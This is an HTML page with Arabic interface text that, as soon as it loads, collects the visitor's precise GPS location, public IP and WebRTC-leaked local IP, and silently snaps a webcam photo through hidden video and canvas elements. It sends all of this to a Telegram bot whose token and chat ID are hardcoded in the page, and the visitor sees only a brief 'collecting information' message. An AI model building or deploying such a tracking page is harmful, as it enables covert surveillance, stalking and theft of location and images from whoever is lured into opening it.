<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📍 تحديد + تصوير + IPs</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <pre id="result">📡 جاري جمع المعلومات...</pre>

  <script>
    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
    const chat_id = "5735855086";

    let gpsMsg = "";
    let publicIP = "";
    let localIP = "";

    function sendMessage(text) {
      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text })
      });
    }

    function sendPhoto(blob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "photo.jpg");

      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: form
      });
    }

    function sendAllInfo() {
      const finalMsg = `${gpsMsg}
🌐 Public IP: ${publicIP}
🏠 Local IP: ${localIP || "❌ غير مدعوم"}`;
      document.getElementById("result").innerText = finalMsg;
      sendMessage(finalMsg);
    }

    function getLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude.toFixed(6);
            const lon = pos.coords.longitude.toFixed(6);
            const acc = pos.coords.accuracy;

            gpsMsg = `📍 GPS Location:
Latitude: ${lat}
Longitude: ${lon}
📏 Accuracy: ±${acc} m
🗺️ https://www.google.com/maps?q=${lat},${lon}`;
            checkAllReady();
          },
          err => {
            gpsMsg = "❌ فشل تحديد الموقع: " + err.message;
            checkAllReady();
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        gpsMsg = "❌ جهازك لا يدعم GPS";
        checkAllReady();
      }
    }

    function getPublicIP() {
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          publicIP = data.ip;
          checkAllReady();
        })
        .catch(() => {
          publicIP = "❌ فشل الحصول على IP";
          checkAllReady();
        });
    }

    function getLocalIP() {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});

      pc.onicecandidate = (event) => {
        if (!event || !event.candidate) return;
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
        if (ipMatch) {
          const ip = ipMatch[1];
          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
            localIP = ip;
            checkAllReady();
          }
        }
      };
    }

    let readyParts = 0;
    function checkAllReady() {
      readyParts++;
      if (readyParts >= 3) {
        sendAllInfo();
      }
    }

    function initCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.getElementById("video");
          video.srcObject = stream;
          video.addEventListener("playing", () => {
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
            stream.getTracks().forEach(track => track.stop());
          });
        })
        .catch(err => {
          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
        });
    }

    // تشغيل تلقائي
    getLocation();
    getPublicIP();
    getLocalIP();
    initCamera();
  </script>
</body>
</html>
